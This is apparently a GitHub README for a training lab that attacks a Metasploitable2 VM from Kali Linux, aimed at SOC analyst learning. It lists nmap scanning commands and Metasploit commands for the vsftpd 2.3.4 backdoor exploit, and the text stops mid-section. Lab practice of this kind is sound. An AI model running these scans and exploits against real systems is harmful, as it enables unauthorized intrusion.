# kali-metasploitable-lab
Penetration testing sim using Kali Linux and Metasploitable2

# Kali Linux & Metasploitable2: Penetration Testing Lab

This project simulates an internal network attack scenario using Kali Linux (attacker) and Metasploitable2 (target). It demonstrates core reconnaissance, exploitation, and post-exploitation techniques aligned with SOC Analyst learning objectives.

---

## Lab Setup

| Component      | Details                        |
|----------------|--------------------------------|
| Attacker       | Kali Linux (UTM VM)            |
| Target         | Metasploitable2 (UTM VM)       |
| Network        | Shared NAT / Bridged           |
| Connectivity   | Confirmed via ping             |

---

## Phase 1: Reconnaissance

### Target IP: `192.168.64.3`

#### Basic Nmap Scan
```bash
nmap -sS -T4 192.168.64.3 -oN basic-scan.txt

#### Service Version Detection
```bash
nmap -sS -sV -T4 192.168.64.3 -oN version-scan.txt

#### Vulnerability Detection
```bash
nmap --script vuln -T4 192.168.64.3 -oN vuln-scan.txt

---

## Phase 2: Exploitation

### Exploit: vsftpd 2.3.4 Backdoor (CVE-2011-2523)

#### Tool Used: Metasploit Framework

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 192.168.64.3
exploit
